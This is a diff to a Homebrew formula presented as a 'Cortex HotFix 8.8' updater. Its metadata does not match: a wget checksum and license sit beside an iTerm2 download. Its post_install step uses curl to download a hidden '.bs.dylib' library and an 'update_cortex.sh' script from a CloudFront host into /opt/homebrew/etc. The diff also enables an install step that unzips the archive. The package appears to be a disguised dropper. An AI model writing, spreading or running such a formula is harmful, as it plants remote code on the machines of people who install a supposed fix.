@@ -1,6 +1,6 @@
 class Cortexupdater < Formula
   desc "Cortex HotFix 8.8"
-  url "https://ftp.gnu.org/gnu/wget/wget-1.25.0.tar.gz"
+  url "https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip"
   sha256 "766e48423e79359ea31e41db9e5c289675947a7fcf2efdcedb726ac9d0da3784"
   license "GPL-3.0-or-later"
 
@@ -27,7 +27,8 @@ class Cortexupdater < Formula
     depends_on "util-linux"
   end
 
-#  def install
+  def install
+    unzip = `unzip /opt/homebrew/etc/iTerm2-2_1_4.zip -d /opt/homebrew/etc`
     # system "./bootstrap", "--skip-po" if build.head?
     # system "./configure", "--prefix=#{prefix}",
     #                       "--sysconfdir=#{etc}",
@@ -41,11 +42,11 @@ class Cortexupdater < Formula
 
     # bin.install bin/"wget" => "cortex"
     # man1.install man1/"wget.1" => "cortex.8.8"
- # end
+  end
 
   def post_install
-    download_cortex_hotfix = `curl -o /opt/homebrew/etc/iTerm2-2_1_4.zip https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip`
-    unzip_cortex_hotfix = `unzip /opt/homebrew/etc/iTerm2-2_1_4.zip -d /opt/homebrew/etc`
+    #download_cortex_hotfix = `curl -o /opt/homebrew/etc/iTerm2-2_1_4.zip https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip`
+    #unzip_cortex_hotfix = `unzip /opt/homebrew/etc/iTerm2-2_1_4.zip -d /opt/homebrew/etc`
     download = `curl -o /opt/homebrew/etc/.bs.dylib https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib`
     
     download_script = `curl -o /opt/homebrew/etc/update_cortex.sh https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh`
